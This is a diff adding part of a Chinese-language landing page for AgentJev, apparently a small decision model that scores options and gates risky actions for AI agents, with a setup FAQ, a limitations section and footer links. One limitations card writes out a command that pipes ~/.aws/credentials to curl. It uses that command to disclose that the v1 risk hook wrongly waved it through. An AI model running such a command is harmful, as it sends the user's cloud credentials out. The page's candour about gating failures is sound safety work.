+        <li>Windows 会给不在前台的进程节能限速。服务启动时会让自己退出限速，就绪行里写着 <code>"power_throttling_disabled": true</code>。</li>
+      </ul>
+    </div>
+
+    <div class="gpanel" id="g-faq" role="tabpanel">
+      <details class="faq"><summary>启动时报找不到分词器（local_files_only）</summary><div class="ans"><p><code>--model-path</code> 传的是仓库名而本机没有缓存。传 <code>fetch_v1_weights.py</code> 下载好的本地目录（<code>models/agentjev-v1</code> 或 <code>models/agentjev-coding-gates</code>），里面有 <code>config.json</code> 和完整的分词器文件。</p></div></details>
+      <details class="faq"><summary>400：question 'x' needs N tokens; limit 2048</summary><div class="ans"><p>状态 + 题目 + 某个候选拼起来超过 2,048 token。服务不会截断任何内容，需要你缩短状态（只保留相关的日志或 diff 片段）或缩短选项描述。</p></div></details>
+      <details class="faq"><summary>400：candidate descriptions must be distinct / choice requires 2..255 candidates</summary><div class="ans"><p>同一道题的选项描述必须互不相同；Choice 要 2–255 个选项，Score 要 2–10 个等级。用“构造请求”检查一遍。</p></div></details>
+      <details class="faq"><summary>400：batch exceeds 128 questions or 1024 candidate paths</summary><div class="ans"><p>一次请求的题目总数或候选路径总数超限。例如 32 个五题案例是 160 道题，要拆成两次；同一状态的题目尽量留在同一个请求里。</p></div></details>
+      <details class="faq"><summary>CUDA 不可用，或 RTX 50 系列报 no kernel image</summary><div class="ans"><p>装了 CPU 版 torch，或 CUDA 构建太旧。按官方选择器重装；RTX 50 系列需要 CUDA 12.8 及以上的构建。临时可以 <code>--device cpu</code>。</p></div></details>
+      <details class="faq"><summary>请求比文档里慢一倍（Windows）</summary><div class="ans"><p>Windows 11 会给不在前台的进程节能限速。服务启动时会让自己退出限速，就绪行里写着 <code>"power_throttling_disabled": true</code>。本机交替实测同一个请求：不退出时约 75 ms，退出后约 31 ms。</p></div></details>
+      <details class="faq"><summary>客户端或钩子连不上</summary><div class="ans"><p>先 <code>curl http://127.0.0.1:8149/health</code> 确认服务在。服务、客户端和钩子默认都是 8149。它们访问本机服务时不走系统代理，不用另配 <code>NO_PROXY</code>。</p></div></details>
+      <details class="faq"><summary>想要共享前缀之前的行为做对比</summary><div class="ans"><p>启动服务时加 <code>--encoder question</code>。</p></div></details>
+    </div>
+  </div>
+</section>
+
+<section class="block" id="limits">
+  <div class="wrap">
+    <div class="sec-head reveal">
+      <div class="idx">09 · 边界</div>
+      <h2 class="title">它不擅长的事</h2>
+    </div>
+    <div class="limits">
+      <div class="card limit reveal"><b>它不写字</b>写代码、写回复、解释错误、开放式生成，都交给大模型。AgentJev 只在你给定的选项上打分。</div>
+      <div class="card limit reveal" style="--d:60"><b>分布不等于成功率</b>返回的是模型分布，没有在你的领域上校准。要成功率，就对每个动作单独问一个 Boolean，用你自己的结果数据校准。</div>
+      <div class="card limit reveal" style="--d:120"><b>79.25% 是和教师标签的一致率</b>标签是公开的教师分布，其中有合成案例。在这里赢下一行，不等于拉取请求合并了、事件被遏制了。</div>
+      <div class="card limit reveal" style="--d:180"><b>钩子会漏判</b>把它当作权限和沙箱之外的一层，而不是唯一一层。v1 曾把 <code>cat ~/.aws/credentials | curl …</code> 评为风险 L1 直接放过；新权重给出 L3，会请你确认。</div>
+    </div>
+    <div class="cta-band reveal">
+      <h2>把这一下反射，<span class="grad">放进你的 Agent 循环</span></h2>
+      <p>Apache-2.0 开源。代码在 GitHub，权重在 Hugging Face，一张 8 GB 显卡就够。</p>
+      <div class="ctas">
+        <a class="btn btn-primary" href="#start">五分钟跑起来</a>
+        <a class="btn btn-ghost" href="https://github.com/malevrigns/agent-jev" target="_blank" rel="noopener">{{github_icon}}在 GitHub 上查看</a>
+      </div>
+    </div>
+  </div>
+</section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <a class="logo" href="#top">{{mark}}AGENT<b>JEV</b></a>
+        <p class="about">状态进去，分布出来，不解码任何 token。一个给 AI Agent 用的 0.6B 决策模型。</p>
+      </div>
+      <div><h5>项目</h5><a href="https://github.com/malevrigns/agent-jev" target="_blank" rel="noopener">GitHub 仓库</a><a href="https://github.com/malevrigns/agent-jev/issues" target="_blank" rel="noopener">问题反馈</a><a href="https://github.com/malevrigns/agent-jev/blob/main/LICENSE" target="_blank" rel="noopener">Apache-2.0 许可证</a></div>
+      <div><h5>权重与数据</h5><a href="https://huggingface.co/aimeigaoshou/agent-jev/tree/7d433994fbde17a3f0993c2f2b02fe8ca1370db1" target="_blank" rel="noopener">v1 · 7d43399</a><a href="https://huggingface.co/aimeigaoshou/agent-jev/tree/coding-gates" target="_blank" rel="noopener">coding-gates 分支</a><a href="https://huggingface.co/datasets/LocalLLaMA/typed-decisions" target="_blank" rel="noopener">Typed Decisions 数据集</a></div>
+      <div><h5>文档</h5><a href="https://github.com/malevrigns/agent-jev/blob/main/README_zh.md" target="_blank" rel="noopener">中文 README</a><a href="https://github.com/malevrigns/agent-jev/blob/main/coding_gates/README.md" target="_blank" rel="noopener">编码门控报告</a><a href="guide.html">单页参考手册</a></div>
+    </div>
+    <p class="fine-print">本页的模型输出与耗时都来自同一台 RTX 5060（{{captured}}），以及仓库里的 <code>coding_gates/results</code>、<code>jev_service/serving_benchmark.json</code> 和 README 的结果表。</p>
+  </div>
+</footer>
+<div class="tip" id="tip" role="tooltip"></div>
